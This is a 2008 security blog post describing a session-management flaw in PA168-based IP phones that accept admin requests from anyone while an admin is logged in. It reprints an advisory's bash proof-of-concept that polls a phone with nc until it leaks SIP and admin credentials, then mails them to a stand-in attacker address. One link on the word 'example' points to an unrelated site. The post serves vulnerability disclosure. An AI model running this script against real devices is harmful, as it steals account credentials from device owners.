<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Holes in Embedded Devices - Binary state session management</title><meta name="description" content="This type of vulnerability is similar to IP address-based session management holes which has been discussed in my previous post. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:"><meta property="name" content="Holes in Embedded Devices - Binary state session management"><meta itemprop="name" content="Holes in Embedded Devices - Binary state session management"><meta property="description" content="This type of vulnerability is similar to IP address-based session management holes which has been discussed in my previous post. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:"><meta itemprop="description" content="This type of vulnerability is similar to IP address-based session management holes which has been discussed in my previous post. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-binary-state-session-management%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-binary-state-session-management%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/holes-in-embedded-devices-binary-state-session-management/"><meta property="og:title" content="Holes in Embedded Devices - Binary state session management"><meta property="og:description" content="This type of vulnerability is similar to IP address-based session management holes which has been discussed in my previous post. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-binary-state-session-management%2F?w=1024"><meta name="twitter:title" content="Holes in Embedded Devices - Binary state session management"><meta name="twitter:description" content="This type of vulnerability is similar to IP address-based session management holes which has been discussed in my previous post. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn't send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fholes-in-embedded-devices-binary-state-session-management%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Holes in Embedded Devices - Binary state session management</h1><div class="date">Tue, 29 Jan 2008 09:52:22 GMT</div><div class="author">by
pagvac</div><div id="post-content"><p>This type of vulnerability is similar to IP address-based session management holes which has been discussed in my <a href="/blog/holes-in-embedded-devices-ip-based-session-management">previous post</a>. It is similar in the sense that the web browser of the admin user who is currently logged into the vulnerable device doesn&#39;t send any auth data such as session IDs or passwords. However, this vulnerability is more serious as illustrated by the algorithm implemented by the session management mechanism of the vulnerable device:</p>
<pre><code>if (submitted username and submitted password) == (credentials on device config)
then
    do activate admin session until session times out


The implications are fatal: the device blindly trusts administrative HTTP requests, while the administrative session is regarded as active. In other words, if the attacker submitted an administrative request to the target device while an admin user was logged in (admin session would be active), the device would happily accept such request as it has no means to differentiate between the requests coming from the legitimate admin and those coming from the attacker!

In this case, the attacker doesn&#39;t need to share the same source IP address with the legitimate admin user, but rather the bad guy can launch an automated attack like the one illustrated in my previous post IP address-based session management from any source IP address. The only requirement is that the submitted HTTP request is well-crafted so it looks exactly like a legitimate request.

A real [example](https://chatbotkit.com/examples) includes IP phones from several brands that are based on the PA168 chipset. Several popular vendors in Asia such as ATCOM and SOYO ship firmwares such as version 1.42 and 1.54 that is susceptible to this vulnerability. Since the attacker can now send the malicious HTTP request from any IP address, these IP phones could be attacked remotely, provided that their web interface was Internet-facing.

The following proof-of-concept script was published with ProCheckUp [PR06-14](http://www.procheckup.com/Vulner_PR0614.php) advisory. Such script repeatedly submits a request to the target IP phone which returns the full configuration settings as soon as an admin user logs into the web interface of the target phone. The returned configuration settings include sensitive data such as SIP gateway, SIP credentials and the credentials required to manage the IP phone:

#!/bin/bash

host=&quot;192.168.10.1&quot;;
attackers_email=&quot;attacker@evil-domain.foo&quot;
req=&quot;POST /g HTTP/1.0\r\nContent-length: 13\r\n\r\nback=++Back++\r\n\r\n&quot;;

while true
do
    res=`echo -en $req | nc -nv $host 80`;
    if echo $res | grep superpassword # if this gets returned, then we got the settings page with all SIP account and IP phone creds
    then
        echo &quot;GOT IT!&quot;
        echo $res &gt; &quot;admin-settings-page&quot;
        echo $res | mail $attackers_email -s &quot;PA168 IP Phone admin&#39;s settings page&quot;
        exit 1
    else
        echo &quot;bad luck&quot;
    fi
    sleep 5
done</code></pre></div></div></article><footer id="footer"><p>Copyright &copy; 2025 <a href=""></a>. All rights reserved.</p></footer></body></html>